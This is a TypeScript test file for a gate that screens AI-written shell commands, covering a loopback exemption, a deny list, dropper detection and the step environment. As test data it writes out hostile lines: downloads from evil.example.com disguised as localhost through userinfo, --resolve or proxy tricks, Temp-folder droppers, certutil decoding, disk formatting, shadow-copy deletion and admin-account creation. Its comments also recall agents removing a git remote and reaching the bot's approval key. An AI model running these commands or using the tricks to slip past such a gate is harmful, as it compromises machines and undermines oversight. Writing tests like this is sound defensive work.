/**
 * The step gate, as assertions that fail: every rule a model-written line meets before it runs.
 *
 * `report.check.ts`, `network.check.ts` and `dangerous.check.ts` print what the gate decides and a
 * person reads it; a verdict that drifts there drifts in silence. This file pins the same gate with
 * checks that set the exit code, in the places where a wrong answer costs the most:
 *
 * - the download hold's loopback exemption, which a URL with `user@` in it must not fool, whether
 *   the userinfo reads "localhost" or "127.0.0.1", nor any other line that names localhost and
 *   reaches somewhere else;
 * - the built-in floor (`dangerous.ts`), which must refuse a dropper run from Temp and must not
 *   refuse a project that happens to have a folder called `temp`, or a sentence with "ii" in it;
 * - the shipped deny list (`schema.ts`), line by line, git writes refused and git reads left open;
 * - `Start-Process` on a name PowerShell resolves to a `.ps1` shim, refused by the trap itself (not
 *   by some other gate) with the `.cmd` fix;
 * - the scripts a line runs, read from disk and screened like the line;
 * - the operator's own deny patterns, an invalid one included;
 * - the bot's own files, port and package, out of a step's reach;
 * - the environment a step is started with, named rather than inherited;
 * - and one decision pin: an administrator's lock does not cap `execution.networkFetch`.
 *
 * A check marked `// DEFECT:` fails on purpose: it names a product defect, and turns green when the
 * defect is fixed. Nothing here starts a server, opens a browser or touches the operator's data: the
 * only files are in a temporary folder, removed at the end.
 *
 *   npx tsx test/gate.check.ts        (npm run check:gate once it is added to package.json)
 */
import { rmSync } from 'node:fs';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Tally } from './support/harness.js';
import { networkFetchReason, onlyLoopbackTargets, botSelfRefusal } from '../src/exec/network.js';
import { dangerousRefusal } from '../src/exec/dangerous.js';
import { checkCommandRefusal, commandRefusal, matchDenyPattern, staticCheck, type PolicyConfig } from '../src/exec/policy.js';
import { findShellExecuteTrap, forgetScriptShims } from '../src/exec/shellExecuteTrap.js';
import { stepEnvironment } from '../src/exec/stepEnv.js';
import { winPsEnv } from '../src/exec/winps.js';
import { RunConfigSchema, loadConfigObject } from '../src/config/schema.js';
import { PolicyLockSchema } from '../src/config/lockedPolicy.js';
import type { Confinement } from '../src/exec/confinement.js';
import type { Shell } from '../src/exec/shells.js';
import type { Step } from '../src/protocol/replySchema.js';

const t = new Tally();
const started = Date.now();
const tmp = await mkdtemp(join(tmpdir(), 'cop-gate-'));
// The `finally` at the end removes the folder; this catches a run killed before it gets there
// (output piped into `head`, whose closed pipe ends node with EPIPE halfway through).
process.once('exit', () => rmSync(tmp, { recursive: true, force: true }));

/** The shipped policy, built exactly as `report.check.ts` builds it: unattended, with isolation claimed. */
const shipped = RunConfigSchema.parse({}).execution;
const unattended: PolicyConfig = {
  mode: 'unattended',
  denyPatterns: shipped.denyPatterns,
  allowedPrograms: shipped.allowedPrograms,
  isolation: 'separate-account',
};
/** A project whose only folder is the temporary one, commands run from its root. */
const project: Confinement = { roots: [tmp], cwd: tmp };
const step = (cmd: string, shell: Shell = 'pwsh'): Step => ({ id: 1, type: 'command', shell, cmd });
const short = (s: string | null | undefined): string => (s ?? 'null').slice(0, 160);

try {
  /*
   * The loopback exemption exists so a task can prove the server it started answers
   * (`curl http://localhost:3000/health`) without waiting all night for an approval. In a URL,
   * everything before the last `@` of the authority is userinfo, not the host: curl and
   * Invoke-WebRequest both fetch `http://localhost:1@evil.example.com/tool.exe` from
   * evil.example.com. If the exemption reads the host as "localhost", the one download the hold was
   * built for — an executable from somewhere else — goes through unheld, and an unattended check
   * runs it without a word.
   */
  console.log('--- the loopback exemption cannot be fooled by userinfo ---');
  /*
   * The bot's own port is read from COP_API_PORT; a shell that happens to set it to 80 or 8080 would
   * make a line below refused as "the bot's own API" instead of as a download, and the check that
   * names the kind of refusal would fail for a reason that has nothing to do with the hold.
   */
  const savedApiPort = process.env.COP_API_PORT;
  delete process.env.COP_API_PORT;
  /*
   * The first three are the plan's lines. The third would be held even with the URL misread,
   * because `x.bin` (bin is not in FILE_EXTENSIONS) reads as a second, non-loopback host; it proves
   * nothing about the URL. The fourth and fifth carry the same 127.0.0.1 userinfo with nothing else
   * on the line that could read as a host (`exe` is a known extension), so only the URL's host parse
   * decides them: a reading that rejects a "localhost…@" userinfo and forgets the IP form fails them.
   */
  const disguised = [
    'curl -o tool.exe http://localhost:1@evil.example.com/tool.exe',
    'Invoke-WebRequest http://localhost:80@evil.example.com/a.ps1 -OutFile a.ps1',
    'curl -o x.bin http://127.0.0.1:8080@evil.example.com/',
    'curl -o x.exe http://127.0.0.1:8080@evil.example.com/',
    'curl http://127.0.0.1:8080@evil.example.com/',
  ];
  for (const cmd of disguised) {
    // The host is what follows the last `@` of the authority, so these are evil.example.com, not this machine.
    t.truthy(`held, not exempt as loopback: ${cmd}`, networkFetchReason(cmd) !== null, 'networkFetchReason returned null');
    const refusal = checkCommandRefusal(cmd, 'pwsh', shipped, project);
    // And a check's gate, which has nobody to ask, refuses the fetch rather than letting it through.
    t.truthy(`refused as a check's command, as a network fetch: ${cmd}`, refusal !== null && refusal.includes('fetches from the network'), short(refusal));
  }
  /*
   * The rest of the class: every other way a line that names localhost reaches somewhere else, or
   * names an address the gate cannot read for certain. Quotes do not end a word to the shell, so a
   * quoted localhost followed by `@host` is one URL with userinfo; a full-width dot becomes a plain
   * one in a URL parser; a variable in the authority can carry `1@evil.example.com`; curl's
   * --resolve, --connect-to and a proxy send a request for localhost to another address; -K reads
   * more of the line from a file; and a second command glued on after a URL's path still counts.
   */
  const rerouted = [
    'curl -o t.exe "http://localhost"@evil.example.com/t.exe',
    "curl -o t.exe 'http://localhost:1'@evil.example.com/t.exe",
    'curl -o t.exe http://localhost\uFF0Eevil.example.com/t.exe',
    'curl -o t.exe http://local%68ost/t.exe',
    'Invoke-WebRequest "http://localhost:$port/tool.exe" -OutFile tool.exe',
    'curl --resolve localhost:80:93.184.216.34 -o tool.exe http://localhost/tool.exe',
    'curl --resolve localhost:80:2001:db8::1 -o tool.exe http://localhost/tool.exe',
    'curl --connect-to localhost:80:evil.example.com:80 -o tool.exe http://localhost/tool.exe',
    'curl --connect-to ::evil.example.com: -o tool.exe http://localhost/tool.exe',
    'curl -x evil.example.com:3128 -o tool.exe http://localhost/tool.exe',
    'curl -x [2001:db8::1]:3128 -o tool.exe http://localhost/tool.exe',
    'curl --proxy http://localhost:1@evil.example.com:3128 -o tool.exe http://localhost/tool.exe',
    'curl -K more.txt -o tool.exe http://localhost/tool.exe',
    "iwr http://localhost/x;iwr('evil.example.com') -OutFile a.exe",
  ];
  for (const cmd of rerouted) {
    t.truthy(`held, not exempt as loopback: ${cmd}`, networkFetchReason(cmd) !== null, 'networkFetchReason returned null');
  }
  if (savedApiPort === undefined) delete process.env.COP_API_PORT;
  else process.env.COP_API_PORT = savedApiPort;
  // The controls: a real health check to this machine is still not held.
  t.check('curl http://localhost:3000/health is loopback only', onlyLoopbackTargets('curl http://localhost:3000/health'), true);
  t.check('curl http://localhost:3000/health is not held', networkFetchReason('curl http://localhost:3000/health'), null);
  t.check('curl http://[::1]:3000/x is not held', networkFetchReason('curl http://[::1]:3000/x'), null);
  // In the shapes a task writes them: a status read off the result, a query, an output file in a
  // dotted project folder or under a drive, curl's -k and -i, which are not -K.
  for (const cmd of [
    '(Invoke-WebRequest http://localhost:3000).StatusCode',
    "(Invoke-WebRequest 'http://localhost:3000').StatusCode",
    'curl "http://localhost:3000/search?q=a&page=2"',
    'curl -o .\\Contoso.Web\\out.json http://localhost:5000/health',
    'Invoke-WebRequest -Uri http://localhost:3000/health -OutFile C:\\out\\health.json',
    'curl -k https://localhost:5001/health',
    'curl -i http://localhost:3000/health',
  ]) {
    t.check(`not held: ${cmd}`, networkFetchReason(cmd), null);
  }
  /*
   * Decision pin: a loopback download saved as `a.zip` is held today. `zip` is not in
   * FILE_EXTENSIONS, so the output name reads as a second host beside the loopback URL, and the
   * exemption errs the safe way (held, not run). Whoever moves this line should move it on purpose.
   */
  t.truthy(
    "pinned: 'curl -o a.zip http://localhost:3000/a.zip' is held (a.zip reads as a host)",
    networkFetchReason('curl -o a.zip http://localhost:3000/a.zip') !== null,
  );

  /*
   * The floor refuses a binary or script run out of the system's Temp, because that is the shape
   * of a dropper. It must not refuse a project's own folder that happens to be called temp or tmp
   * — a seed script, a test fixture — nor a sentence that contains the word "ii": a guard that
   * stops honest work is a guard that gets switched off, and this one cannot be.
   */
  console.log('\n--- the built-in floor does not refuse honest work ---');
  const honest = [
    'node .\\temp\\seed.js',
    'node src/temp/build.js',
    'npx vitest run test/tmp/fixture.test.js',
    'Get-Content .\\src\\temp\\a.js',
    "Write-Output 'phase ii done'",
    // The same two mistakes in other clothes: a project under C:\Projects with a temp folder, a
    // variable whose name starts with TEMP, and "ii" as a numeral in a heading, a message and a list.
    'node C:\\Projects\\app\\temp\\seed.js',
    'node $env:TEMPLATE_DIR\\gen.js',
    "Set-Content README.md '## Phase II of the rollout'",
    "Write-Output 'II Results'",
    'Write-Output "Steps: (i) build, (ii) test, (iii) ship"',
  ];
  for (const cmd of honest) {
    // Temp is the system's Temp, by its own spellings, never a project folder named temp or tmp; and
    // `ii` is refused only where PowerShell would run it as a command, never as a word in a sentence.
    t.check(`not refused: ${cmd}`, dangerousRefusal(cmd), null);
  }
  const droppers = [
    '& "$env:LOCALAPPDATA\\Temp\\upd.exe"',
    'C:\\Windows\\Temp\\x.exe',
    'Start-Process $env:TEMP\\a.exe',
    'ii .\\report.hta',
    'Invoke-Item .\\x.lnk',
    'certutil -decode a b',
    // Temp by its other names, each of which reaches the same folder.
    '& "$env:TMP\\a.exe"',
    '%TMP%\\a.exe',
    '& "${env:TEMP}\\a.exe"',
    '& "$env:windir\\Temp\\a.exe"',
    '%SystemRoot%\\Temp\\a.exe',
    'node --require=/tmp/x.js',
    'C:/tmp/a.exe',
    // A handler launched wherever PowerShell runs it as a command: a pipe, a block, an assignment, a nested shell.
    'Get-Item x.hta | ii',
    'Get-ChildItem *.lnk | Invoke-Item',
    'Get-ChildItem *.hta | ForEach-Object { ii $_ }',
    '$null = ii .\\x.hta',
    "pwsh -c 'ii .\\x.hta'",
    "Start-Process pwsh -ArgumentList '-c','ii x.hta'",
  ];
  for (const cmd of droppers) t.truthy(`still refused: ${cmd}`, dangerousRefusal(cmd) !== null, 'dangerousRefusal returned null');

  /*
   * The shipped deny list, through the step gate as a real run would meet it. Each of these once
   * was, or plainly could be, a model's way of "fixing" something: a wiped folder, a formatted
   * drive, a registry edit, a machine switched off, a repository changed behind the runner's back
   * (a run once removed a remote to make a bad check pass). And the other half: auditing a
   * repository is real work, so every git question stays open.
   */
  console.log('\n--- the shipped deny list refuses every destructive line ---');
  const destructive = [
    'Remove-Item -Recurse -Force .\\build',
    'format D:',
    'reg add HKCU\\x /v y /d z',
    'reg delete HKCU\\x',
    'shutdown /s /t 0',
    'Stop-Computer',
    'Restart-Computer',
    'Set-ExecutionPolicy Unrestricted',
    'diskpart',
    'bcdedit /set x',
    'vssadmin delete shadows /all',
    'Disable-WindowsOptionalFeature -Online -FeatureName x',
  ];
  /*
   * Making an account, or putting one into a group. The ordinary form gives the password before
   * `/add`, and the rest are the same act in another spelling; each is named by the list itself below.
   */
  const netUserAdd = 'net user bob p /add';
  const accounts = [
    'net user bob * /add',
    'net.exe user bob p /add',
    'NET USER bob p /ADD',
    'net localgroup administrators bob /add',
    'New-LocalUser -Name bob -NoPassword',
    'Add-LocalGroupMember -Group Administrators -Member bob',
  ];
  const gitWrites = [
    'git commit -m x',
    'git push',
    'git reset --hard',
    'git checkout -b x',
    'git restore a.txt',
    'git clean -fd',
    'git add -A',
    'git stash',
    'git branch -D x',
    'git tag -d v1',
    'git config --unset user.name',
    'git init',
    'git pull',
    'git remote remove origin',
    'git remote set-url origin x',
  ];
  for (const cmd of [...destructive, netUserAdd, ...accounts, ...gitWrites]) {
    const d = staticCheck(step(cmd), unattended);
    t.check(`skipped: ${cmd}`, d?.action ?? null, 'skip');
  }
  /*
   * The deny list is "refused outright, in both modes" (policy.ts), and in a watched run the
   * operator may switch the allowlist off, so the list has to name each line on its own rather than
   * lean on `net` or `diskpart` happening to be off the allowlist.
   */
  for (const cmd of [...destructive, ...accounts, ...gitWrites]) {
    t.truthy(`the deny list itself names: ${cmd}`, matchDenyPattern(cmd, shipped.denyPatterns) !== null, 'no shipped pattern matched');
  }
  // The control: the pattern exists and names the form without a password.
  t.truthy('the deny list itself names: net user bob /add', matchDenyPattern('net user bob /add', shipped.denyPatterns) !== null, 'no shipped pattern matched');
  // The ordinary form gives the password before /add; the list names it on its own, not because `net` is off the allowlist.
  t.truthy(`the deny list itself names: ${netUserAdd}`, matchDenyPattern(netUserAdd, shipped.denyPatterns) !== null, 'no shipped pattern matched');
  // And it is about making accounts, not about looking at them.
  for (const cmd of ['net user', 'net user bob', 'net localgroup administrators', 'Get-LocalUser', 'Get-LocalGroupMember -Group Administrators']) {
    t.check(`the deny list leaves alone: ${cmd}`, matchDenyPattern(cmd, shipped.denyPatterns), null);
  }
  const gitReads = [
    'git status',
    'git log -1',
    'git diff',
    'git show HEAD',
    'git branch --show-current',
    'git rev-parse HEAD',
    'git ls-files',
    'git blame a.txt',
    'git merge-base --is-ancestor a b',
    'git remote -v',
    'git config --get user.name',
  ];
  for (const cmd of gitReads) {
    const d = staticCheck(step(cmd), unattended);
    t.check(`allowed: ${cmd}`, d, null);
  }

  /*
   * `Start-Process npx` hands `npx.ps1` to the Windows shell, which fails or opens a "Select an
   * app" dialog nobody answers; the step hangs and nothing listens on the port. The PATH is built
   * here, as report.check.ts builds it, so the verdict does not depend on what this machine has
   * installed: npx, npm and pnpm have a `.ps1` beside a `.cmd`, node and pwsh are `.exe`s, and
   * notepad-unknown-xyz is not on PATH at all.
   */
  console.log('\n--- Start-Process on a .ps1 shim is refused with the .cmd fix ---');
  const shimDir = join(tmp, 'shims');
  await mkdir(shimDir, { recursive: true });
  for (const f of ['npx.ps1', 'npx.cmd', 'npm.ps1', 'npm.cmd', 'pnpm.ps1', 'pnpm.cmd', 'node.exe', 'pwsh.exe']) {
    await writeFile(join(shimDir, f), '');
  }
  forgetScriptShims();
  const shimEnv = { PATH: shimDir, PATHEXT: '.COM;.EXE;.BAT;.CMD' };
  const trapped = [
    'Start-Process npx -ArgumentList vite',
    'start npx vite',
    'saps npm run dev',
    'Start-Process pnpm dev',
    'Start-Process .\\run.ps1',
    'Start-Process -FilePath npx',
    'Start-Process npm -ArgumentList start',
  ];
  /*
   * A watched run with the allowlist off: the policy under which the trap is the only rule that can
   * object to these lines, so a refusal there is the trap's or nobody's.
   */
  const watchedNoAllowlist: PolicyConfig = { mode: 'confirm', denyPatterns: shipped.denyPatterns, allowedPrograms: [] };
  const reasonOf = (d: ReturnType<typeof staticCheck>): string | null => (d?.action === 'skip' ? d.reason : null);
  for (const cmd of trapped) {
    const trap = findShellExecuteTrap(cmd, 'pwsh', shimEnv);
    const shippedDecision = staticCheck(step(cmd), unattended, shimEnv);
    t.check(`skipped: ${cmd}`, shippedDecision?.action ?? null, 'skip');
    /*
     * The refusal must be the trap's own sentence, not an accident of another gate: otherwise the
     * gate could stop calling the trap and every line above would stay green. With the allowlist off
     * nothing else can object, so there it must be the trap's for every line.
     */
    const watchedDecision = staticCheck(step(cmd), watchedNoAllowlist, shimEnv);
    t.truthy(
      `it is the .ps1 trap's refusal (watched, allowlist off): ${cmd}`,
      trap !== null && watchedDecision?.action === 'skip' && watchedDecision.reason === trap,
      short(reasonOf(watchedDecision)),
    );
    /*
     * Under the shipped unattended policy the allowlist runs before the trap (policy.ts: its
     * precise messages win), and `.\run.ps1` is a program named by path that is not on the list, so
     * the allowlist refuses it first. That is the intended order; for that one line the pin is that
     * the allowlist is the rule that spoke, and for the rest it must be the trap.
     */
    if (cmd === 'Start-Process .\\run.ps1') {
      t.truthy(
        `under the shipped policy the allowlist refuses it first: ${cmd}`,
        shippedDecision?.action === 'skip' && shippedDecision.reason.includes('is not in execution.allowedPrograms'),
        short(reasonOf(shippedDecision)),
      );
    } else {
      t.truthy(
        `it is the .ps1 trap's refusal (shipped, unattended): ${cmd}`,
        trap !== null && shippedDecision?.action === 'skip' && shippedDecision.reason === trap,
        short(reasonOf(shippedDecision)),
      );
    }
  }
  const first = staticCheck(step(trapped[0]!), unattended, shimEnv);
  t.truthy("the reason names the fix, 'npx.cmd'", first?.action === 'skip' && first.reason.includes("'npx.cmd'"), short(reasonOf(first)));
  const working = [
    'Start-Process npx.cmd -ArgumentList vite',
    'Start-Process node server.js',
    "Start-Process pwsh -ArgumentList '-File','x.ps1'",
    'Start-Process notepad-unknown-xyz',
  ];
  /*
   * The trap alone must let each working form through. Judged with the trap as the only rule that
   * could object — the watched run with the allowlist off, above — because under the shipped
   * unattended policy two of them are refused by other rules, on purpose: `Start-Process pwsh` is a
   * shell inside a shell (programs.ts), and notepad-unknown-xyz is not on the allowlist.
   */
  for (const cmd of working) {
    t.check(`the trap lets it through: ${cmd}`, findShellExecuteTrap(cmd, 'pwsh', shimEnv), null);
    t.check(`allowed (watched, allowlist off): ${cmd}`, staticCheck(step(cmd), watchedNoAllowlist, shimEnv), null);
  }
  // And the two plain ones are allowed under the shipped unattended policy as well.
  for (const cmd of working.slice(0, 2)) t.check(`allowed (shipped, unattended): ${cmd}`, staticCheck(step(cmd), unattended, shimEnv), null);
  // `start` in cmd is cmd's own built-in, which runs npx.cmd through PATHEXT and never meets the .ps1.
  t.check("with shell 'cmd', 'start npx vite' is allowed", staticCheck(step('start npx vite', 'cmd'), unattended, shimEnv), null);
  forgetScriptShims();

  /*
   * A script a line runs is read from disk and screened like the line: otherwise `certutil`, which
   * no step may say, is one `Set-Content` and one `.\evil.ps1` away. Judged with the allowlist off
   * (commandRefusal's own default), because under the shipped allowlist a script named by path is
   * turned away as an off-list program before it is read; the reading is what stands when the list
   * is off, and when an allowed interpreter runs the file (`powershell -File`), checked below too.
   */
  console.log('\n--- scripts a line runs are screened like the line ---');
  await writeFile(join(tmp, 'evil.ps1'), 'certutil -decode a b\n');
  await writeFile(join(tmp, 'ok.ps1'), 'Write-Output ok\n'.repeat(Math.ceil((300 * 1024) / 16)));
  await writeFile(join(tmp, 'fetch.ps1'), 'Invoke-WebRequest https://x.example/y -OutFile z\n');
  const refuse = (cmd: string, allowed: string[] = []): string | null =>
    commandRefusal(cmd, 'pwsh', shipped.denyPatterns, allowed, process.env, project);
  for (const cmd of ['. .\\evil.ps1', '& .\\evil.ps1', '.\\evil.ps1', 'powershell -File .\\evil.ps1']) {
    const r = refuse(cmd);
    t.truthy(`refused, naming certutil in the script: ${cmd}`, r !== null && r.includes('certutil') && r.includes('in the script'), short(r));
  }
  const viaInterpreter = refuse('powershell -File .\\evil.ps1', shipped.allowedPrograms);
  t.truthy(
    'with the shipped allowlist, powershell -File still names certutil in the script',
    viaInterpreter !== null && viaInterpreter.includes('certutil') && viaInterpreter.includes('in the script'),
    short(viaInterpreter),
  );
  const big = refuse('.\\ok.ps1');
  t.truthy("a 300 KB script is refused as larger than a step's script", big !== null && big.includes("larger than a step's script"), short(big));
  const missing = refuse('.\\missing.ps1');
  t.truthy('a script that is not there is refused, not run on trust', missing !== null && missing.includes('does not exist'), short(missing));
  const writeAndRun = refuse("Set-Content a.ps1 'x'; .\\a.ps1");
  t.truthy('writing a script and running it in one line is refused', writeAndRun !== null && writeAndRun.includes('writes a script and runs it'), short(writeAndRun));
  const fetched = checkCommandRefusal('.\\fetch.ps1', 'pwsh', { denyPatterns: shipped.denyPatterns, allowedPrograms: [] }, project);
  t.truthy("a check running a script that downloads is refused as a network fetch", fetched !== null && fetched.includes('fetches from the network'), short(fetched));

  /*
   * The operator's list is theirs to write, and a typo in it must not switch it off: an invalid
   * regular expression falls back to a plain substring rather than to "matches nothing". And
   * PowerShell is case-insensitive, so the list is too.
   */
  console.log("\n--- the operator's deny list ---");
  t.check('an invalid pattern still matches, as a substring', matchDenyPattern('please run tool([x now', ['tool([x']), 'tool([x');
  const typo = commandRefusal('please run tool([x now', 'pwsh', ['tool([x']);
  t.truthy('and refuses the command, naming the pattern', typo !== null && typo.includes('matches deny pattern /tool([x/'), short(typo));
  t.truthy(
    'patterns match without regard to case',
    matchDenyPattern('REMOVE-ITEM -recurse x', ['remove-item\\s+-recurse']) !== null,
  );

  /*
   * The loopback exemption must not become the way a step reaches the process that approves its
   * steps: its API port, its key, its records, or — installed from npm — its own package.
   */
  console.log("\n--- the bot's own files and package are out of reach ---");
  for (const cmd of [
    'Get-Content C:\\bot\\dev-pids.json',
    'Get-Content C:\\bot\\data\\api-token',
    'Remove-Item C:\\bot\\runs -Recurse',
    'npm uninstall copilot-operator',
    'Invoke-RestMethod http://127.0.0.1:4000/api/sessions',
  ]) {
    t.truthy(`refused: ${cmd}`, botSelfRefusal(cmd, [4000], 'C:\\bot') !== null, 'botSelfRefusal returned null');
  }
  for (const cmd of ['Get-Content .\\src\\a.ts', 'curl http://127.0.0.1:5173/']) {
    t.check(`not the bot's: ${cmd}`, botSelfRefusal(cmd, [4000], 'C:\\bot'), null);
  }

  /*
   * A step is started with the variables Windows and the toolchains need, by name. The bot's own
   * key (put in its environment by `npm start` for the web build) once reached a step, which could
   * then approve its own held download; PSModulePath from PowerShell 7 breaks Windows PowerShell's
   * modules; and install scripts are switched off because a postinstall is download-then-run.
   */
  console.log('\n--- the step environment ---');
  const from = { Path: 'p', NEXT_PUBLIC_COP_TOKEN: 't', COP_API_PORT: '1', PSModulePath: 'm', MY_DB: 'd', OTEL_EXPORTER: 'o', HTTPS_PROXY: 'x' };
  const env = stepEnvironment(from, ['MY_DB']);
  const keys = Object.keys(env);
  t.check('Path is passed, found without regard to case', env.Path, 'p');
  t.check("none of the bot's own keys", keys.filter((k) => /^(NEXT_PUBLIC_)?COP_/i.test(k)), []);
  t.check('no PSModulePath', keys.filter((k) => /psmodulepath/i.test(k)), []);
  t.check('a variable the operator named in passEnv is passed', env.MY_DB, 'd');
  t.check('a variable nobody named is not', 'OTEL_EXPORTER' in env, false);
  t.check('the proxy is passed', env.HTTPS_PROXY, 'x');
  t.check('NO_COLOR=1', env.NO_COLOR, '1');
  t.check('TERM=dumb', env.TERM, 'dumb');
  t.check('npm install scripts are off', env.npm_config_ignore_scripts, 'true');
  t.check('yarn install scripts are off', env.YARN_ENABLE_SCRIPTS, '0');
  t.check('without passEnv, MY_DB is not passed', 'MY_DB' in stepEnvironment(from), false);
  const ps = winPsEnv({ PSModulePath: 'a', psmodulepath: 'b', Path: 'p' });
  t.check("Windows PowerShell's environment has no PSModulePath in any case", Object.keys(ps).filter((k) => /psmodulepath/i.test(k)), []);
  t.check('and keeps Path', ps.Path, 'p');

  /*
   * Decision pin (operator, declined): an administrator's `policy.lock.json` does not cap
   * `execution.networkFetch`. The lock is strict, so a lock that names the field is not a lock that
   * caps it but a malformed lock, and a malformed lock stops the configuration from loading rather
   * than running unlocked. The two `pinned:` checks carry the decision; the valid lock between them
   * is a control that shows a lock still applies and leaves a field it does not name alone.
   */
  console.log('\n--- decision pin: the lock does not cap execution.networkFetch ---');
  t.check('pinned: networkFetch is not a field of the lock', PolicyLockSchema.safeParse({ networkFetch: 'ask' }).success, false);
  const lockBase = join(tmp, 'lock');
  await mkdir(lockBase, { recursive: true });
  // The machine-wide lock is read from %ProgramData%; point it at an empty folder so this machine's own lock, if any, is not read.
  const savedProgramData = process.env.ProgramData;
  process.env.ProgramData = join(tmp, 'programdata');
  try {
    await writeFile(join(lockBase, 'policy.lock.json'), JSON.stringify({ maxMode: 'confirm' }), 'utf8');
    const resolved = await loadConfigObject({ execution: { mode: 'unattended', networkFetch: 'run' } }, lockBase);
    t.check('a valid lock still applies (mode forced to confirm)', resolved.execution.mode, 'confirm');
    // A control, not the pin: this lock names no networkFetch, so it shows only that a lock leaves the field alone.
    t.check('a lock without networkFetch leaves it as set', resolved.execution.networkFetch, 'run');
    await writeFile(join(lockBase, 'policy.lock.json'), JSON.stringify({ maxMode: 'confirm', networkFetch: 'ask' }), 'utf8');
    let loadError = '';
    try {
      await loadConfigObject({ execution: { networkFetch: 'run' } }, lockBase);
    } catch (e) {
      loadError = (e as Error).message;
    }
    t.truthy('pinned: a lock naming networkFetch is malformed, and the configuration does not load', /not a valid policy lock/.test(loadError) && /networkFetch/.test(loadError), loadError || 'it loaded');
  } finally {
    if (savedProgramData === undefined) delete process.env.ProgramData;
    else process.env.ProgramData = savedProgramData;
  }
} catch (e) {
  t.truthy('ran without throwing', false, (e as Error).stack ?? String(e));
} finally {
  forgetScriptShims();
  await rm(tmp, { recursive: true, force: true, maxRetries: 5 });
}

console.log(`\nran in ${((Date.now() - started) / 1000).toFixed(1)} s`);
t.finish();
